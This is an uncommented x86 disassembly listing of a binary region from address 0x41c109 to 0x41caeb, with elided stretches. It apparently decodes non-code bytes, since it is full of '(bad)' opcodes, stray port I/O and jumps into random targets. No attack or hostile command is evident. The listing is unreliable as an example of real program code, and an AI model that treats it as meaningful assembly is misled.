  41c109:	sbb    edx,DWORD PTR ds:0x995abd75
  41c10f:	sub    al,al
  41c111:	pushf  
  41c112:	mov    BYTE PTR ds:0x1883ab78,dl
  41c118:	jns    0x41c0cc
  41c11a:	jge    0x41c132
  41c11c:	push   0x60339b9d
  41c121:	xchg   ebx,eax
  41c122:	mov    ss,WORD PTR [esi]
  41c124:	jo     0x41c0ee
  41c126:	out    0x36,eax
  41c128:	cmp    DWORD PTR [ebp-0x36b4e58d],0xba5a404c
  41c132:	pop    ecx
  41c133:	(bad)  
  41c134:	ja     0x41c0e1
  41c136:	inc    ebx
  41c137:	sbb    DWORD PTR [ecx],edi
  41c139:	mov    dl,0x3d
  41c13b:	pop    ss
  41c13c:	push   0x60341b9d
  41c141:	xchg   ebx,eax
  41c142:	dec    esi
  41c143:	pop    ss
  41c144:	xor    al,cl
  41c146:	out    0x36,eax
  41c148:	inc    ecx
  41c149:	mov    ebp,0xc94b1b33
  41c14e:	or     al,0x40
  41c150:	pop    edx
  41c151:	mov    edx,0xb9e6e419
  41c156:	add    eax,0x19bdf925
  41c15b:	inc    eax
  41c15c:	in     al,dx
  41c15d:	mov    dh,0xfc
  41c15f:	sub    al,BYTE PTR [eax]
	...
  41c189:	sti    
  41c18a:	mov    ah,0xfa
  41c18c:	aas    
  41c18d:	loop   0x41c13d
  41c18f:	pop    ss
  41c190:	inc    eax
  41c191:	in     al,0xb3
  41c193:	cli    
  41c194:	pop    ss
  41c195:	in     eax,dx
  41c196:	pop    edx
  41c197:	mov    edx,0xd6cefa32
  41c19c:	and    al,0xce
  41c19e:	mov    ebp,0xc8f349b3
  41c1a3:	stos   DWORD PTR es:[edi],eax
  41c1a4:	ss jmp 0x41c173
  41c1a7:	int3   
  41c1a8:	daa    
  41c1a9:	fdiv   DWORD PTR [ecx-0x4436d038]
  41c1af:	add    BYTE PTR [ecx-0x418b3600],ah
  41c1b5:	adc    esp,ecx
  41c1b7:	pop    esp
  41c1b8:	scas   eax,DWORD PTR es:[edi]
  41c1b9:	jmp    0x41c165
  41c1bb:	dec    eax
  41c1bc:	mov    ?,WORD PTR [edx]
  41c1be:	mov    DWORD PTR [eax],0x74b94eba
  41c1c4:	xchg   esi,eax
  41c1c5:	inc    eax
  41c1c6:	int    0x63
  41c1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1c9:	push   ebp
  41c1ca:	mov    ds:0xac3bbb72,al
  41c1cf:	pop    edi
  41c1d0:	jg     0x41c216
  41c1d2:	mov    bh,0x44
  41c1d4:	add    BYTE PTR [eax-0x51],0x6d
  41c1d8:	dec    esi
  41c1d9:	push   eax
  41c1da:	mov    edx,0xcd0d5571
  41c1df:	ja     0x41c216
  41c1e1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41c1e3:	push   eax
  41c1e4:	and    DWORD PTR ds:0x8e974cc,ecx
  41c1ea:	mov    al,0x66
  41c1ec:	xor    eax,0x0
	...
  41c215:	add    BYTE PTR ds:0x5c4c72a2,dl
  41c21b:	cdq    
  41c21c:	pop    edi
  41c21d:	cmp    eax,eax
  41c21f:	xchg   ebp,eax
  41c220:	pop    edi
  41c221:	pop    ss
  41c222:	push   DWORD PTR [edi-0x5423e49d]
  41c228:	pop    edi
  41c229:	pop    ds
  41c22a:	cmp    esi,DWORD PTR [edi-0x50c0ffbc]
  41c230:	ins    DWORD PTR es:[edi],dx
  41c231:	push   cs
  41c232:	sar    BYTE PTR [ecx-0x32d30a8f],1
  41c238:	ja     0x41c24f
  41c23a:	out    0xa6,al
  41c23c:	push   eax
  41c23d:	and    DWORD PTR ds:0x2fe974cc,ebp
  41c243:	mov    ds:0xb034da71,al
  41c248:	jb     0x41c217
  41c24a:	pop    ds
  41c24b:	xchg   ebx,eax
  41c24c:	ins    DWORD PTR es:[edi],dx
  41c24d:	fidiv  DWORD PTR [ebx]
  41c24f:	xchg   ecx,eax
  41c250:	pop    edi
  41c251:	add    BYTE PTR [eax+0x79],ch
  41c254:	add    BYTE PTR [ebp+0x76],dl
  41c257:	jns    0x41c2cb
  41c259:	add    BYTE PTR [ecx+0x75],bh
  41c25c:	outs   dx,BYTE PTR ds:[esi]
  41c25d:	gs xor eax,0x5a785f63
  41c263:	je     0x41c2d9
  41c265:	jo     0x41c252
  41c267:	je     0x41c2d7
  41c269:	imul   eax,DWORD PTR ds:0xbc484382,0xa7454c86
  41c273:	pop    ebp
  41c274:	inc    ebp
  41c275:	outs   dx,BYTE PTR ds:[esi]
  41c276:	jbe    0x41c2e2
  41c278:	pop    ebp
  41c279:	ins    BYTE PTR es:[edi],dx
	...
  41c2a2:	add    BYTE PTR [ecx-0xa8d9a67],bl
  41c2a8:	xchg   ebx,eax
  41c2a9:	je     0x41c31b
  41c2ab:	sub    al,0x8d
  41c2ad:	gs dec esi
  41c2af:	fs jb  0x41c313
  41c2b2:	add    BYTE PTR [esi],dl
  41c2b4:	mov    WORD PTR [esi+0x74],fs
  41c2b7:	jb     0x41c337
  41c2b9:	jb     0x41c320
  41c2bb:	stc    
  41c2bc:	xchg   ebx,eax
  41c2bd:	push   0x618af669
  41c2c2:	jb     0x41c2cd
  41c2c4:	test   BYTE PTR [ebp+0x6e],ah
  41c2c7:	popa   
  41c2c8:	mov    WORD PTR [ebx+0x73],?
  41c2cb:	aad    0x96
  41c2cd:	imul   ebp,DWORD PTR [ebp+0x28],0x7e
  41c2d1:	outs   dx,BYTE PTR ds:[esi]
  41c2d2:	and    BYTE PTR fs:[ecx+0x0],ch
  41c2d6:	push   ebx
  41c2d7:	mov    dh,BYTE PTR [ebx+0x74]
  41c2da:	ja     0x41c2f0
  41c2dc:	imul   esp,DWORD PTR [ecx+0x5c],0x73656f42
  41c2e3:	sbb    DWORD PTR [edx+0x72],edi
  41c2e6:	pop    esp
  41c2e7:	adc    DWORD PTR [esp+esi*2+0x403d4961],ecx
  41c2ee:	outs   dx,DWORD PTR ds:[esi]
  41c2ef:	push   0x1c6e5d70
  41c2f4:	adc    BYTE PTR [esi],ah
  41c2f6:	jb     0x41c314
  41c2f8:	lock dec ecx
  41c2fa:	jo     0x41c2cb
  41c2fc:	add    BYTE PTR [edx],ch
  41c2fe:	je     0x41c2bf
  41c300:	sub    eax,DWORD PTR [ecx]
  41c302:	push   ecx
  41c303:	(bad)  
  41c306:	jno    0x41c308
	...
  41c330:	enter  0x3d33,0x47
  41c334:	lods   al,BYTE PTR ds:[esi]
  41c335:	in     al,0x17
  41c337:	addr16 nop
  41c339:	aad    0x28
  41c33b:	pop    esp
  41c33c:	imul   eax,DWORD PTR ds:0x2704640,0x1
  41c343:	pop    esp
  41c344:	mov    ebp,ebx
  41c346:	cs cs test eax,edx
  41c34a:	sub    DWORD PTR [eax],eax
  41c34c:	inc    edx
  41c34d:	fld    TBYTE PTR [esi]
  41c34f:	addr16 sbb al,0xe9
  41c352:	xor    ebx,DWORD PTR [ebp+0x5a]
  41c355:	jle    0x41c38b
  41c357:	add    BYTE PTR [eax-0x75],ah
  41c35a:	xor    al,BYTE PTR [eax]
  41c35c:	pop    eax
  41c35d:	outs   dx,DWORD PTR ds:[esi]
  41c35e:	inc    esi
  41c35f:	inc    esp
  41c360:	push   ebp
  41c361:	test   BYTE PTR [ecx+eax*2],al
  41c364:	imul   ebx,DWORD PTR [esi+0x47],0x4625046
  41c36b:	dec    edi
  41c36c:	pop    edi
  41c36d:	jp     0x41c39a
  41c36f:	jno    0x41c3a1
  41c371:	adc    DWORD PTR [edx],0x2d851c77
  41c377:	data16 adc BYTE PTR [ecx+0x23],ch
  41c37b:	jb     0x41c376
  41c37d:	test   DWORD PTR [ebp+0x6c],eax
  41c380:	sti    
  41c381:	push   ebx
  41c382:	and    ebp,DWORD PTR [edi+ebp*8+0x74]
  41c386:	inc    ebx
  41c387:	push   eax
  41c388:	loope  0x41c3e7
  41c38a:	inc    ecx
  41c38b:	jae    0x41c375
  41c38d:	dec    esi
  41c38e:	inc    esi
  41c38f:	push   esp
  41c390:	int3   
  41c391:	adc    ebx,edx
  41c393:	pop    ds
	...
  41c3bc:	add    ah,dl
  41c3be:	pop    edx
  41c3bf:	(bad)  
  41c3c0:	xor    BYTE PTR [edi-0x17bd4762],bh
  41c3c6:	scas   eax,DWORD PTR es:[edi]
  41c3c7:	(bad)  
  41c3c8:	das    
  41c3c9:	mov    esi,0xed03d9b9
  41c3ce:	scas   eax,DWORD PTR es:[edi]
  41c3cf:	int    0x17
  41c3d1:	mov    cl,0xb9
  41c3d3:	mov    ecx,0xc397d028
  41c3d8:	cs mov esi,0xdd32bbb9
  41c3de:	cdq    
  41c3df:	mov    bh,0x48
  41c3e1:	js     0x41c37f
  41c3e3:	xchg   esp,eax
  41c3e4:	pop    ss
  41c3e5:	jg     0x41c380
  41c3e7:	mov    ebx,0xc7893c33
  41c3ec:	xor    ecx,DWORD PTR [esi+0x6d288db0]
  41c3f2:	int3   
  41c3f3:	nop
  41c3f4:	cmp    BYTE PTR cs:[edx-0x63a4c07d],0x93
  41c3fc:	cs jno 0x41c3ae
  41c3ff:	dec    ecx
  41c400:	and    eax,0x2f3a5b4e
  41c405:	cmp    al,bh
  41c407:	pop    esi
  41c408:	and    eax,0x472bb64e
  41c40d:	xor    BYTE PTR [eax-0x53b7dab7],dh
  41c413:	sub    al,BYTE PTR [ebp+0x4c]
  41c416:	xchg   esi,eax
  41c417:	adc    eax,DWORD PTR [ebx+0x2f]
  41c41a:	mov    DWORD PTR [esi+eax*2+0x48],0xd6c7ab
	...
  41c44a:	cmp    edx,DWORD PTR [ebx-0x6100cef2]
  41c450:	cmp    BYTE PTR [ebx-0x10],al
  41c453:	scas   eax,DWORD PTR es:[edi]
  41c454:	(bad)  
  41c455:	das    
  41c456:	(bad)  
  41c457:	mov    ecx,0xafcd03f9
  41c45c:	add    eax,0xb9e918
  41c461:	sti    
  41c462:	xor    al,0x9f
  41c464:	inc    ebp
  41c465:	std    
  41c466:	xor    bh,BYTE PTR [ebp-0x65f12aa1]
  41c46c:	aas    
  41c46d:	mov    ecx,0xdc419ee4
  41c472:	xor    edi,DWORD PTR [esi+eax*2+0x357b0fb5]
  41c479:	or     eax,esi
  41c47b:	int3   
  41c47c:	ins    DWORD PTR es:[edi],dx
  41c47d:	mov    DWORD PTR [edx+ecx*8],0xb0fac071
  41c484:	pop    edi
  41c485:	mov    ebp,0xbd418fe3
  41c48a:	dec    edx
  41c48b:	mov    al,0x6c
  41c48d:	mov    edi,DWORD PTR [eax]
  41c48f:	leave  
  41c490:	add    BYTE PTR [edx-0x698b4ac6],bh
  41c496:	cmp    cl,cl
  41c498:	arpl   WORD PTR [ebp-0x7492509e],sp
  41c49e:	cmp    BYTE PTR [edi-0x549f55af],ch
  41c4a4:	inc    ebx
  41c4a5:	lea    ebx,[esi-0x36]
  41c4a8:	je     0x41c4f6
  41c4aa:	bound  esp,QWORD PTR [edi+0x950]
	...
  41c4d4:	add    BYTE PTR [eax],al
  41c4d6:	add    al,dh
  41c4d8:	pop    esi
  41c4d9:	dec    eax
  41c4da:	inc    esi
  41c4db:	sti    
  41c4dc:	mov    ecx,0xa75d385c
  41c4e1:	ins    DWORD PTR es:[edi],dx
  41c4e2:	push   esi
  41c4e3:	in     al,dx
  41c4e4:	mov    eax,0xac183b5f
  41c4e9:	ins    DWORD PTR es:[edi],dx
  41c4ea:	dec    edi
  41c4eb:	add    al,0xc8
  41c4ed:	pop    edi
  41c4ee:	cmp    edi,ebx
  41c4f0:	sahf   
  41c4f1:	inc    ebp
  41c4f2:	adc    eax,0xd5fb949
  41c4f7:	dec    ebp
  41c4f8:	pushf  
  41c4f9:	aas    
  41c4fa:	cmp    ebx,esp
  41c4fc:	sahf   
  41c4fd:	inc    ecx
  41c4fe:	adc    al,0x24
  41c500:	mov    edx,0x87190046
  41c505:	and    BYTE PTR [eax],bh
  41c507:	mov    dh,BYTE PTR gs:[edx+0x6f]
  41c50b:	sbb    esi,DWORD PTR [esi+0x6f]
  41c50e:	jae    0x41c52c
  41c510:	jo     0x41c580
  41c512:	popa   
  41c513:	jno    0x41c593
  41c515:	dec    ebp
  41c516:	inc    ebx
  41c517:	mov    DWORD PTR [edi+0x6b],ebp
  41c51a:	ins    BYTE PTR es:[edi],dx
  41c51b:	push   edi
  41c51c:	jns    0x41c590
  41c51e:	add    BYTE PTR [ecx-0x69],dh
  41c521:	ins    BYTE PTR es:[edi],dx
  41c522:	outs   dx,DWORD PTR ds:[esi]
  41c523:	addr16 jns 0x41c592
  41c526:	push   ebx
  41c527:	xchg   BYTE PTR [ecx-0x646ebab0],bl
  41c52d:	jno    0x41c5a3
  41c52f:	pop    eax
  41c530:	cwde   
  41c531:	push   esp
  41c532:	push   eax
  41c533:	add    eax,0xa26c437e
  41c538:	jnp    0x41c597
  41c53a:	ins    BYTE PTR es:[edi],dx
	...
  41c563:	add    dh,al
  41c565:	call   0x753f:0x7db8503d
  41c56c:	jns    0x41c5e3
  41c56e:	inc    esi
  41c56f:	push   esp
  41c570:	xchg   ebp,eax
  41c571:	cmp    DWORD PTR [ebp+0x72],ecx
  41c574:	mov    ds:0x61475c59,al
  41c579:	outs   dx,DWORD PTR ds:[esi]
  41c57a:	bound  esp,QWORD PTR [ecx+0x71]
  41c57d:	mov    WORD PTR [edi],?
  41c57f:	inc    ecx
  41c580:	adc    eax,0x68435c96
  41c585:	arpl   WORD PTR [ecx+0x46],sp
  41c588:	or     DWORD PTR [edi+0x634c4c20],eax
  41c58e:	popa   
  41c58f:	add    BYTE PTR [ecx],dl
  41c591:	pushf  
  41c592:	jno    0x41c608
  41c594:	pop    eax
  41c595:	xchg   ebp,eax
  41c596:	push   esp
  41c597:	push   eax
  41c598:	mov    ch,0x7d
  41c59a:	outs   dx,DWORD PTR ds:[esi]
  41c59b:	ins    DWORD PTR es:[edi],dx
  41c59c:	jae    0x41c613
  41c59e:	pop    ebp
  41c59f:	je     0x41c526
  41c5a1:	mov    ch,BYTE PTR [ebx+0x66]
  41c5a4:	sbb    al,0x60
  41c5a6:	adc    ebx,DWORD PTR [edi+0xe]
  41c5a9:	push   edi
  41c5aa:	inc    eax
  41c5ab:	inc    esi
  41c5ac:	or     BYTE PTR [ebx+0xf],dl
  41c5af:	push   0x5c347bda
  41c5b4:	das    
  41c5b5:	xor    al,0x30
  41c5b7:	ins    DWORD PTR es:[edi],dx
  41c5b8:	cli    
  41c5b9:	inc    edi
  41c5ba:	adc    al,0x5f
  41c5bc:	into   
  41c5bd:	push   cs
  41c5be:	cmp    eax,0x1012c046
  41c5c3:	push   0x310be2
	...
  41c5f0:	add    bh,ch
  41c5f2:	cld    
  41c5f3:	and    dh,BYTE PTR [ebx+esi*4+0x12]
  41c5f7:	packsswb mm2,mm0
  41c5fa:	cmc    
  41c5fb:	sub    al,0x5f
  41c5fd:	scas   eax,DWORD PTR es:[edi]
  41c5fe:	sbb    eax,DWORD PTR [ebx+0x58]
  41c601:	int3   
  41c602:	iret   
  41c603:	aam    0xff
  41c605:	fs in  al,0xf
  41c608:	je     0x41c687
  41c60a:	into   
  41c60b:	sub    al,0x63
  41c60d:	mov    gs,esi
  41c60f:	and    DWORD PTR [esp+esi*2+0x2],esi
  41c613:	and    dh,BYTE PTR [esp+eax*4+0x32]
  41c617:	adc    DWORD PTR [edi+0x68],ebx
  41c61a:	jmp    0x5f15:0xc17a4700
  41c621:	jo     0x41c5e1
  41c623:	loope  0x41c674
  41c625:	cmp    eax,0x58002c9e
  41c62a:	xchg   ebx,eax
  41c62b:	adc    BYTE PTR [edi+0x62],bl
  41c62e:	xchg   ebp,eax
  41c62f:	sub    BYTE PTR [ecx+edi*1-0x60],ah
  41c633:	add    al,0x5c
  41c635:	dec    edi
  41c636:	stos   DWORD PTR es:[edi],eax
  41c637:	adc    BYTE PTR [ebx+0x2f],ah
  41c63a:	dec    esp
  41c63b:	and    BYTE PTR [edi+0x30],bl
  41c63e:	xor    dh,BYTE PTR ds:0x259b294f
  41c644:	imul   ecx,DWORD PTR [edx+0x5b],0x5b08250b
  41c64b:	cmp    ecx,DWORD PTR [ebx+eax*1-0x38]
  41c64f:	sbb    ebp,DWORD PTR [ebx]
  41c651:	push   cs
  41c652:	ret    0x1fbd
	...
  41c67d:	add    bl,bl
  41c67f:	(bad)  
  41c680:	out    0x37,eax
  41c682:	fisubr DWORD PTR [esi-0x6b0be8f8]
  41c688:	sysenter 
  41c68a:	rol    BYTE PTR [edi-0x511dc819],0xc8
  41c691:	push   ss
  41c692:	les    edx,FWORD PTR [edi+edi*4-0x187917cd]
  41c699:	aaa    
  41c69a:	fidiv  DWORD PTR [ecx-0x4e29df45]
  41c6a0:	shl    DWORD PTR [edi],cl
  41c6a2:	rcr    DWORD PTR [edx-0x65],cl
  41c6a5:	push   ss
  41c6a6:	ret    
  41c6a7:	(bad)  
  41c6a8:	int3   
  41c6a9:	sub    bl,al
  41c6ab:	lods   al,BYTE PTR ds:[esi]
  41c6ac:	enter  0x7f22,0xc9
  41c6b0:	aad    0x1b
  41c6b2:	xchg   DWORD PTR [edi-0x4971c819],ebp
  41c6b8:	mov    ah,BYTE PTR [eax]
  41c6ba:	jb     0x41c683
  41c6bc:	call   0x6d15:0x8cc56e20
  41c6c3:	ins    DWORD PTR es:[edi],dx
  41c6c4:	jg     0x41c6ee
  41c6c6:	js     0x41c723
  41c6c8:	xchg   ebx,eax
  41c6c9:	and    DWORD PTR [ebx-0x51],edi
  41c6cc:	test   BYTE PTR ds:0x2553af43,bl
  41c6d2:	add    al,bl
  41c6d4:	dec    esp
  41c6d5:	sub    BYTE PTR [eax+ebp*4],bl
  41c6d8:	inc    esi
  41c6d9:	and    cl,BYTE PTR [eax-0x3c]
  41c6dc:	dec    eax
  41c6dd:	push   ss
  41c6de:	aas    
  41c6df:	lahf   
  41c6e0:	sub    eax,0x2d
	...
  41c709:	add    BYTE PTR [eax],al
  41c70b:	inc    eax
  41c70c:	mov    dh,0x21
  41c70e:	sub    eax,0x4800af38
  41c713:	sbb    BYTE PTR [edx-0x39d3b893],ch
  41c719:	pop    edi
  41c71a:	sbb    edi,DWORD PTR ds:0x3410469f
  41c720:	mov    eax,0xaf34005a
  41c725:	pop    edi
  41c726:	leave  
  41c727:	loop   0x41c6d7
  41c729:	addr16 or al,0x46
  41c72c:	mov    DWORD PTR [eax],0x74ca3630
  41c732:	or     BYTE PTR [edi+ebp*4],dh
  41c735:	pop    ebp
  41c736:	and    eax,0xb100c909
  41c73b:	push   es
  41c73c:	retf   0xe974
  41c73f:	or     al,0xca
  41c741:	arpl   bx,bx
  41c743:	pop    ds
  41c744:	stos   DWORD PTR es:[edi],eax
  41c745:	pop    edi
  41c746:	ficom  DWORD PTR [edx]
  41c748:	pop    ebx
  41c749:	push   eax
  41c74a:	(bad)  
  41c74b:	or     edi,eax
  41c74d:	add    BYTE PTR [ebx-0x42925004],bl
  41c753:	cld    
  41c754:	jp     0x41c79a
  41c756:	shl    BYTE PTR [ecx],0x5b
  41c759:	push   ecx
  41c75a:	mov    WORD PTR [ecx],gs
  41c75c:	mov    cl,0x63
  41c75e:	fwait
  41c75f:	dec    DWORD PTR [esi+0x5b3c9977]
  41c765:	push   ecx
  41c766:	test   BYTE PTR [ecx],dl
  41c768:	mov    cl,0x63
  41c76a:	jnp    0x41c771
  41c76c:	mov    ds:0x7a6d,eax
	...
  41c795:	add    BYTE PTR [eax],al
  41c797:	add    BYTE PTR [ebx],bl
  41c799:	pop    ebx
  41c79a:	push   ecx
  41c79b:	mov    WORD PTR [ecx],cs
  41c79d:	mov    cl,0x63
  41c79f:	jnp    0x41c766
  41c7a1:	lea    esi,[ecx+0x4c]
  41c7a4:	sub    bl,BYTE PTR [ebx+0x51]
  41c7a7:	inc    esp
  41c7a8:	xor    dh,BYTE PTR [ecx-0x5549a49d]
  41c7ae:	pop    edi
  41c7af:	pop    edx
  41c7b0:	adc    DWORD PTR [ebx+0x51],ebx
  41c7b3:	add    BYTE PTR [eax+0x51],ah
  41c7b6:	jbe    0x41c81d
  41c7b8:	out    0x44,eax
  41c7ba:	dec    ebp
  41c7bb:	outs   dx,DWORD PTR ds:[esi]
  41c7bc:	out    0x4a,eax
  41c7be:	add    BYTE PTR [eax-0x1c],dl
  41c7c1:	dec    edx
  41c7c2:	push   0x725a5600
  41c7c7:	jbe    0x41c7e9
  41c7c9:	push   ecx
  41c7ca:	push   esp
  41c7cb:	jns    0x41c7f2
  41c7cd:	pop    edx
  41c7ce:	add    BYTE PTR [esp+0x50],cl
  41c7d2:	je     0x41c7f4
  41c7d4:	push   ss
  41c7d5:	pop    edx
  41c7d6:	jb     0x41c84e
  41c7d8:	and    BYTE PTR [ecx+0x20],dl
  41c7db:	dec    eax
  41c7dc:	sbb    dl,BYTE PTR [eax+0x74]
  41c7df:	add    BYTE PTR [ecx],bh
  41c7e1:	jle    0x41c852
  41c7e3:	je     0x41c80a
  41c7e5:	jo     0x41c848
  41c7e7:	jb     0x41c85c
  41c7e9:	pop    ecx
  41c7ea:	jb     0x41c80c
  41c7ec:	or     BYTE PTR [edi+0x61],0x72
  41c7f0:	inc    ebp
  41c7f1:	mov    ds:0x3e71735d,al
  41c7f6:	push   eax
  41c7f7:	gs addr16 dec esp
  41c7fa:	popa   
  41c7fb:	jb     0x41c7fd
	...
  41c825:	adc    eax,0xd6735d6f
  41c82a:	pop    ebp
  41c82b:	dec    esp
  41c82c:	popa   
  41c82d:	mov    dh,0x69
  41c82f:	and    BYTE PTR [ebx-0x60],dl
  41c832:	dec    edi
  41c833:	jbe    0x41c89a
  41c835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c836:	cmp    eax,0x69976f4d
  41c83b:	add    BYTE PTR [esp+eiz*4+0x4e],cl
  41c83f:	je     0x41c861
  41c841:	xchg   BYTE PTR [eax+0x72],bl
  41c844:	jbe    0x41c7d6
  41c846:	dec    edi
  41c847:	and    BYTE PTR [eax-0x5c],dl
  41c84a:	imul   ebp,DWORD PTR [eax+0x0],0x746f7e09
  41c851:	adc    eax,0x1c726170
  41c856:	call   0x7019:0x6ffc721d
  41c85d:	cmp    DWORD PTR [edi+edi*1+0x54],eax
  41c861:	dec    esp
  41c862:	fs dec edx
  41c864:	pop    edi
  41c865:	sub    bl,BYTE PTR [ebx+0x79105f1f]
  41c86b:	push   ss
  41c86c:	add    dl,bl
  41c86e:	ja     0x41c8a4
  41c870:	and    bh,bl
  41c872:	push   0x61fd6b25
  41c877:	and    BYTE PTR [ebx-0x12],ah
  41c87a:	inc    ebx
  41c87b:	pop    ds
  41c87c:	je     0x41c86a
  41c87e:	dec    edi
  41c87f:	sub    DWORD PTR [ecx-0x10],esi
  41c882:	sub    DWORD PTR ds:0x3543e878,ecx
  41c888:	inc    edx
	...
  41c8b1:	add    cl,dl
  41c8b3:	aaa    
  41c8b4:	and    eax,0x12f3c863
  41c8b9:	ins    DWORD PTR es:[edi],dx
  41c8ba:	mov    ebx,0xb350e121
  41c8bf:	sub    DWORD PTR ds:0x1e15bd75,ecx
  41c8c5:	add    BYTE PTR [edx],al
  41c8c7:	sub    BYTE PTR [edx],ah
  41c8c9:	je     0x41c8e7
  41c8cb:	push   0x26
  41c8cd:	jo     0x41c87e
  41c8cf:	inc    ebx
  41c8d0:	xor    al,0x6d
  41c8d2:	sub    dh,0xf
  41c8d5:	pop    edi
  41c8d6:	mov    fs,edi
  41c8d8:	xor    al,0x42
  41c8da:	ins    BYTE PTR es:[edi],dx
  41c8db:	add    BYTE PTR ds:0xe046050,ch
  41c8e1:	ins    BYTE PTR es:[edi],dx
  41c8e2:	mov    bh,bl
  41c8e4:	or     al,0x20
  41c8e6:	dec    esp
  41c8e7:	mov    ah,0x28
  41c8e9:	ins    DWORD PTR es:[edi],dx
  41c8ea:	and    BYTE PTR [edx],0x3f
  41c8ed:	push   esp
  41c8ee:	dec    esp
  41c8ef:	into   
  41c8f0:	inc    ebp
  41c8f1:	pop    edi
  41c8f2:	inc    ebp
  41c8f3:	mov    eax,0x5b435101
  41c8f8:	dec    ebp
  41c8f9:	adc    BYTE PTR [ecx-0x46],dl
  41c8fc:	pop    ecx
  41c8fd:	and    DWORD PTR [eax-0x63],esp
  41c900:	pop    esp
  41c901:	sub    BYTE PTR [eax-0x42],cl
  41c904:	push   ebx
  41c905:	xor    al,0x2e
  41c907:	enter  0x1e56,0xfc
  41c90b:	mov    ecx,DWORD PTR [esi+0x1e]
  41c90e:	sub    BYTE PTR [eax-0x6900edb8],dh
  41c914:	sub    DWORD PTR [ecx],edx
	...
  41c93e:	add    BYTE PTR [eax],al
  41c940:	(bad)  
  41c941:	or     al,0x10
  41c943:	in     al,dx
  41c944:	lods   al,BYTE PTR ds:[esi]
  41c945:	push   cs
  41c946:	daa    
  41c947:	cli    
  41c948:	jp     0x41c977
  41c94a:	xor    ah,cl
  41c94c:	jp     0x41c978
  41c94e:	sub    bl,bh
  41c950:	mov    ebp,0xa5c81015
  41c955:	or     BYTE PTR ds:0x271a5af2,ch
  41c95b:	ret    0xf6ae
  41c95e:	and    al,0xce
  41c960:	mov    ebp,0xa0ec41c3
  41c965:	mov    bl,0x33
  41c967:	loopne 0x41c905
  41c969:	fsub   QWORD PTR [edi]
  41c96b:	enter  0xd3bd,0xe3
  41c96f:	jecxz  0x41c91d
  41c971:	(bad)  
  41c972:	es ret 0xa57a
  41c976:	das    
  41c977:	int3   
  41c978:	xchg   esi,eax
  41c979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c97a:	adc    edx,DWORD PTR [eax-0x72da413e]
  41c980:	pop    ebx
  41c981:	mov    edx,0x96af8226
  41c986:	and    al,0x8e
  41c988:	mov    esi,0xc76f41b3
  41c98d:	jnp    0x41c9af
  41c98f:	push   0x7926798b
  41c994:	rol    edi,0x32
  41c997:	jno    0x41c95a
  41c999:	add    BYTE PTR [ebp+0x2a],bh
  41c99c:	cwde   
  41c99d:	jb     0x41c923
  41c99f:	or     ebx,DWORD PTR [ebp+0x5573]
	...
  41c9c9:	add    BYTE PTR [eax],al
  41c9cb:	add    ah,dh
  41c9cd:	mov    ebx,0xc62e3974
  41c9d2:	ins    DWORD PTR es:[edi],dx
  41c9d3:	dec    edi
  41c9d4:	rcr    BYTE PTR [ebp-0x6547c6ac],0x6c
  41c9db:	push   eax
  41c9dc:	std    
  41c9dd:	enter  0x1d74,0x5b
  41c9e1:	stos   DWORD PTR es:[edi],eax
  41c9e2:	je     0x41ca24
  41c9e4:	inc    ebx
  41c9e5:	leave  
  41c9e6:	jno    0x41c9d1
  41c9e8:	dec    esi
  41c9e9:	(bad)  
  41c9ea:	sbb    ax,0x981b
  41c9ee:	jb     0x41c9f4
  41c9f0:	inc    esp
  41c9f1:	popf   
  41c9f2:	push   eax
  41c9f3:	das    
  41c9f4:	sub    al,0x8b
  41c9f6:	add    BYTE PTR ds:0x1a74aa39,bl
  41c9fc:	cmp    eax,0x3b1071aa
  41ca01:	leave  
  41ca02:	inc    esi
  41ca03:	add    BYTE PTR [esp+edi*4],al
  41ca06:	add    BYTE PTR [edx],bl
  41ca08:	add    DWORD PTR [edi-0x3ff4259d],ebp
  41ca0e:	jb     0x41c9f9
  41ca10:	ror    al,1
  41ca12:	jno    0x41c9f1
  41ca14:	add    bh,al
  41ca16:	ins    BYTE PTR es:[edi],dx
  41ca17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca18:	add    BYTE PTR [ebp-0x50be16d1],ch
  41ca1e:	imul   ecx,ebp,0x1f
  41ca21:	xchg   edi,eax
  41ca22:	push   ecx
  41ca23:	les    eax,FWORD PTR [eax-0x57]
  41ca26:	je     0x41c9cf
  41ca28:	inc    ebx
  41ca29:	mov    eax,DWORD PTR [eax]
  41ca2b:	scas   eax,DWORD PTR es:[edi]
  41ca2c:	inc    eax
  41ca2d:	lods   eax,DWORD PTR ds:[esi]
  41ca2e:	ins    DWORD PTR es:[edi],dx
  41ca2f:	fwait
	...
  41ca58:	add    BYTE PTR [eax],dh
  41ca5a:	scas   eax,DWORD PTR es:[edi]
  41ca5b:	arpl   WORD PTR [edx-0x6aa044ff],bx
  41ca61:	pop    ds
  41ca62:	mov    ds:0x66660067,eax
  41ca67:	imul   esi,DWORD PTR [edx-0x64],0x40
  41ca6b:	popa   
  41ca6c:	popa   
  41ca6d:	pop    ecx
  41ca6e:	pop    edx
  41ca6f:	pop    ebp
  41ca70:	fs cdq 
  41ca72:	dec    esp
  41ca73:	bound  ebp,QWORD PTR [ebx+0x33]
  41ca76:	jnp    0x41cad5
  41ca78:	je     0x41ca2f
  41ca7a:	dec    ecx
  41ca7b:	jno    0x41cae6
  41ca7d:	data16 test BYTE PTR [esi],ch
  41ca80:	fs fs dec ebx
  41ca83:	add    BYTE PTR [ecx+ecx*1+0x66],bl
  41ca87:	jb     0x41caeb
  41ca89:	push   edx
  41ca8a:	jne    0x41cae0
  41ca8c:	push   eax
  41ca8d:	test   DWORD PTR [ebx+0x6b],ebp
  41ca90:	dec    cx
  41ca92:	push   0x7318725d
  41ca97:	push   esp
  41ca98:	jne    0x41cac1
  41ca9a:	jns    0x41cb07
  41ca9c:	inc    esi
  41ca9d:	cmp    DWORD PTR [edi+0x0],ebp
  41caa0:	imul   esi,DWORD PTR [ebx+0x4b],0x83116174
  41caa7:	jo     0x41cb0a
  41caa9:	imul   eax,DWORD PTR [edx+0x55225300],0x49247774
  41cab3:	popa   
  41cab4:	pop    esp
  41cab5:	xchg   BYTE PTR [edi+0x74],bh
  41cab8:	popa   
  41cab9:	cmp    DWORD PTR [eax+0x46],0x46
	...
  41cae4:	add    BYTE PTR [eax],al
  41cae6:	jns    0x41cb52
  41cae8:	add    BYTE PTR [ebx+0x57],al
  41caeb:	push   ebp
